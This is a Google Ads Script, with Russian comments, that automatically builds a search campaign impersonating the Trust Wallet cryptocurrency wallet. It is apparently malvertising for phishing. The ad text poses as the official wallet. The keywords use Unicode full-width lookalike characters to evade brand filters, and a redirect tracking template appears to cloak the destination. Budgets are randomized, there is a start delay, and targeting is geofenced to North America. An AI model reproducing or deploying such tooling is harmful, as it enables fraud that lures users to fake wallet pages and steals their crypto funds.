function main() {
    //
    //
    Utilities.sleep(300000);

    var url__ = ""; // <- здесь меняешь ссылку объявления
    var trackingUrl__ = "";

    //
    //

    var bgt = Math.random() * 700 + 4290; // бюджет | максимум 9.9, минимум 2.9
    bgt = Math.round(bgt);
    bgt = bgt / 100;
    // bgt = 2;
    var key__ = getKeyword();
    var opts = {
        cOpts: {
            name: "Search-1", // <- Меняй название кампании, если предыдущий запуск был неуспешным (по любой причине) и запускаешь повторно
            budget: bgt,
            lang: "", //it;es;pt <- несколько языков в таком формате
            type: "Search",
            strategy: "Manual CPC", //    "Manual CPC", "CPC (enhanced)",  "Target CPA", "Maximize clicks", "Maximize conversions"
            // network: "Search", //  если нужны оба, то null без кавычек
            status: "Enabled", // "Paused" or "Enabled"
        },
        gOpts: {
            name: "AdGroup - 1",
            cpc: "1.90",
            keywords: [
                // ниже вставляй свои ключевые слова. Строго соблюдай синтаксис (кавычки и косые линии) для вразового соответствия
                { word: key__, cpc: 1.9 },
                { word: '"' + key__ + '"', cpc: 1.9 },
                { word: "[" + key__ + "]", cpc: 1.9 },
            ],
        },
        aOpts: {
            h1: ["Trust Wallet", "Trust Wallet Connect", "Trust Wallet Start Now", "Trust Wallet Web Connect"],
            h2: ["Get Information", "Sign Up Online Secure", "Connect and Start Now"],
            h3: ["Fast safe Web Access", "Information online", "Connect With Web"],
            d1: [
                "Trust Wallet Safe & Secure Get Information. Fast & safe Web Access",
                "Trust Wallet Safe & Secure Get Information",
                "Wallet near you. Fast Access & secure. Manage your wallet assets.",
            ],
            d2: [
                "Connect With Web Access - Secure Access",
                "Work safely in the internet. Make all actions private and confident.",
                "Connect With Web Access - Secure Access. Available worldwide.",
            ],
            url: url__,
        },
        lOpt: {
            // локации на включение и исключение выбирай из списка ниже
            inc: [],
            exc: getExList(),
        },
        proximity: {
            usa_canada: [
                { latitude: 31.026506, longitude: -83.550279, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 31.517295, longitude: -94.929197, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 34.504072, longitude: -107.122562, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 38.908067, longitude: -115.987799, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 41.864044, longitude: -79.122059, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 42.162039, longitude: -93.92916, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 47.634543, longitude: -104.751423, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 47.929833, longitude: -121.824176, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 48.786545, longitude: -62.209513, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 52.641946, longitude: -94.062455, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 53.631387, longitude: -80.762931, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 58.492732, longitude: -113.310502, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 61.408568, longitude: -72.535589, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 61.440798, longitude: -129.090288, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 61.514941, longitude: -155.44576, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 64.131637, longitude: -92.507275, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 66.862751, longitude: -111.370071, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 67.83573, longitude: -145.755818, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
                { latitude: 70.817208, longitude: -78.917916, radius: 500, radiusUnits: "MILES", bidModifier: 1 },
            ],
        },
        tracking: {
            enabled: true,
            template:
                "https://clickserve.dartsearch.net/link/click?{_dssagcrid}&{_dssftfiid}&ds_e_adid={creative}&ds_e_matchtype={ifsearch:search}{ifcontent:content}&ds_url_v=2&ds_dest_url={_uurl}/?url={lpurl}",
            uurl: trackingUrl__,
        },
        /**
 * 
2040	Austria
2196	Cyprus
2203	Czechia
2276	Germany
2300	Greece
2348	Hungary
2380	Italy
2616	Poland
2620	Portugal
2642	Romania
2703	Slovakia
2724	Spain
20277	Canary Islands
2643	Russia 

 */
    };

    _updateAd(opts);

    //showAllPlacementExclusions(opts.cOpts.name);
}

function _updateAd(opts) {
    var campResult = _createSearchCampaigns(opts.cOpts);
    if (!campResult.ok) {
        Logger.log("Problem! createCampaigns");
        return 0;
    }
    Utilities.sleep(7000);
    var adGroupResult = _addGroup(opts.cOpts.name, opts.gOpts);
    if (!adGroupResult.ok) {
        Logger.log("Problem! addGroup");
        return 0;
    }

    Utilities.sleep(7000);
    var adReustlt = _addExpandedTextAd(opts.cOpts.name, opts.gOpts.name, opts.aOpts);
    if (!adReustlt.ok) {
        Logger.log("Problem! addExpandedTextAd");
        return 0;
    }

    Utilities.sleep(2000);
    _addLocations(opts.cOpts.name, opts.lOpt.inc);

    Utilities.sleep(2000);
    _remLocations(opts.cOpts.name, opts.lOpt.exc);

    targetCampaignByProximity(opts)
    insertTemplate(opts);
    Logger.log("All was done! ! !");
}

function _addLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.addLocation(loc, 1);
        }
    }
}

function _remLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.excludeLocation(loc, 1);
        }
    }
}

function _createSearchCampaigns(cOpts) {
    try {
        var columns = [
            "Campaign",
            "Budget",
            /*"Networks",*/ "Language",
            "Bid Strategy type",
            "Campaign type",
            "Campaign Status",
        ];

        var upload = AdWordsApp.bulkUploads().newCsvUpload(columns, {
            moneyInMicros: false,
        });

        upload.append({
            Campaign: cOpts.name || "Search-1.",
            Budget: cOpts.budget,
            "Budget type": "Daily",
            //Networks: cOpts.network,
            Language: cOpts.lang,
            "Campaign type": cOpts.type,
            "Ad rotation": "Optimize for clicks",
            "Bid Strategy type": cOpts.strategy,
            "Campaign Status": cOpts.status,
        });
        // Use upload.apply() to make changes without previewing.
        upload.apply();
        return { ok: true };
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}

function _addGroup(campaignName, gOpts) {
    //Logger.log(campaignName);
    //Logger.log(gOpts);
    try {
        var campaignIterator = AdsApp.campaigns()
            .withCondition('Name = "' + campaignName + '"')
            .get();
        if (campaignIterator.hasNext()) {
            var campaign = campaignIterator.next();
            var adGroupOperation = campaign.newAdGroupBuilder().withName(gOpts.name).withCpc(gOpts.cpc).build();
            var adGroup = adGroupOperation.getResult();
            if (gOpts.keywords)
                if (gOpts.keywords.length) {
                    for (var i = 0; i < gOpts.keywords.length; i++) {
                        var kw = gOpts.keywords[i];
                        var keywordOperation = adGroup.newKeywordBuilder().withText(kw.word).withCpc(kw.cpc).build();
                        var keyword = keywordOperation.getResult();
                    }
                }
            return { adGroup: adGroup, campaign: campaign, ok: true };
        }
    } catch (error) {
        Logger.log(error);
    }

    return { ok: false };
}

function _addExpandedTextAd(campaignName, adGroupName, aOpts) {
    try {
        var adGroupIterator = AdsApp.adGroups()
            .withCondition('Name = "' + adGroupName + '"')
            .withCondition('CampaignName = "' + campaignName + '"')
            .get();

        if (adGroupIterator.hasNext()) {
            var adGroup = adGroupIterator.next();
            var adOperation = adGroup
                .newAd()
                .expandedTextAdBuilder()
                .withHeadlinePart1(shuffleArray(aOpts.h1))
                .withHeadlinePart2(shuffleArray(aOpts.h2))
                .withHeadlinePart3(shuffleArray(aOpts.h3))
                .withDescription1(shuffleArray(aOpts.d1))
                .withDescription2(shuffleArray(aOpts.d2))
                .withFinalUrl(aOpts.url)
                .build();

            var ad = adOperation.getResult();
            return {
                ok: true,
                adGroup: adGroup,
                ad: ad,
            };
        }
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}

function shuffleArray(array) {
    if (!array) return "";
    if (!array.length) return "";
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    return array[0];
}

function getLabels() {
    const labels = {};
    var lbls = AdsApp.labels().get();
    Logger.log(lbls.totalNumEntities());
    while (lbls.hasNext()) {
        var lbl = lbls.next();
        Logger.log(lbl.getName() + " : " + lbl.getDescription());
        labels[lbl.getName()] = lbl.getDescription();
    }
    return labels;
}

function insertTemplate(opts) {
    if (!opts.tracking.enabled) return;
    const options = {
        customParameter_uurl: opts.tracking.uurl, // insert your redirect here
        trackingTemplate: opts.tracking.template,
        insertCustomParameter: true,
        insertTrakingTemplate: true,
        levelCustomParameter: "AD_GROUP", // AD_GROUP | CAMPAIGN
        levelTrakingTemplate: "CAMPAIGN", // AD_GROUP | CAMPAIGN
    };

    var campaignsIterator = AdsApp.campaigns().get();
    var groupsIterator = AdsApp.adGroups().get();

    while (campaignsIterator.hasNext()) {
        var object = campaignsIterator.next();
        if (options.insertCustomParameter && options.levelCustomParameter == "CAMPAIGN") {
            object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
        }
        if (options.insertTrakingTemplate && options.levelTrakingTemplate == "CAMPAIGN") {
            object.urls().setTrackingTemplate(options.trackingTemplate);
        }
    }

    while (groupsIterator.hasNext()) {
        var object = groupsIterator.next();
        if (options.insertCustomParameter && options.levelCustomParameter == "AD_GROUP") {
            object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
        }
        if (options.insertTrakingTemplate && options.levelTrakingTemplate == "AD_GROUP") {
            object.urls().setTrackingTemplate(options.trackingTemplate);
        }
    }
}

function getExList() {
    return [
        2012, 2024, 2031, 2032, 2044, 2048, 2050, 2051, 2052, 2064, 2068, 2070, 2072, 2076, 2084, 2090, 2096, 2100,
        2104, 2108, 2112, 2116, 2120, 2132, 2140, 2144, 2148, 2152, 2156, 2158, 2162, 2166, 2170, 2174, 2178, 2180,
        2184, 2188, 2191, 2196, 2203, 2204, 2212, 2214, 2218, 2222, 2226, 2231, 2232, 2233, 2239, 2242, 2258, 2260,
        2262, 2266, 2268, 2270, 2275, 2288, 2296, 2300, 2308, 2316, 2320, 2324, 2328, 2332, 2334, 2336, 2340, 2348,
        2352, 2356, 2360, 2368, 2376, 2384, 2388, 2392, 2398, 2400, 2404, 2410, 2414, 2417, 2418, 2422, 2426, 2428,
        2430, 2434, 2438, 2440, 2446, 2450, 2454, 2458, 2462, 2466, 2470, 2478, 2480, 2484, 2492, 2496, 2498, 2499,
        2504, 2508, 2512, 2516, 2520, 2524, 2531, 2534, 2535, 2540, 2548, 2558, 2562, 2566, 2570, 2574, 2580, 2581,
        2583, 2584, 2585, 2586, 2591, 2598, 2600, 2604, 2608, 2612, 2616, 2620, 2624, 2626, 2630, 2634, 2642, 2643,
        2646, 2654, 2659, 2662, 2666, 2670, 2674, 2678, 2682, 2686, 2688, 2690, 2694, 2702, 2703, 2704, 2705, 2706,
        2710, 2716, 2740, 2748, 2762, 2764, 2768, 2772, 2776, 2780, 2784, 2788, 2792, 2795, 2798, 2800, 2804, 2807,
        2818, 2831, 2832, 2834, 2854, 2858, 2860, 2862, 2876, 2882, 2887, 2894,
    ];
}

function getKeyword() {
    const kws = [
        "Truｓt  Wａllｅｔ",
        "Trｕsｔ  Ｗaｌｌｅt",
        "Ｔｒｕsｔ  Ｗaｌleｔ",
        "Tｒｕsｔ  Walｌｅt",
        "Ｔｒuｓｔ  Wａｌlet",
        "Trｕsｔ  Ｗａｌlｅｔ",
        "Trust  Ｗａｌｌｅｔ",
        "Trｕｓｔ  Ｗａlｌｅｔ",
        "Trusｔ  Wａｌｌet",
        "Ｔｒｕst  Wａlｌｅt",
        "Tｒｕｓt  Wａｌleｔ",
        "Ｔｒuｓt  Ｗａｌlet",
        "Ｔrｕsｔ  Wａｌlｅｔ",
        "Tｒuｓt  Ｗaｌleｔ",
        "Tｒuｓｔ  Walleｔ",
        "Ｔrusｔ  Wａllet",
        "Ｔrｕst  Waｌｌｅt",
        "Ｔrust  Ｗalleｔ",
        "Ｔruｓｔ  Ｗallet",
        "Ｔｒuｓt  Wａlｌeｔ",
        "Trｕsｔ  Ｗａｌｌet",
    ];
    return kws[Math.floor(Math.random() * kws.length)];
}
function targetCampaignByProximity(opts) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + opts.cOpts.name + '"')
        .get();
    while (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        for (var i=0;i< opts.proximity.usa_canada.length;i++) {
            campaign.addProximity(opts.proximity.usa_canada[i]);
        }
    }
}
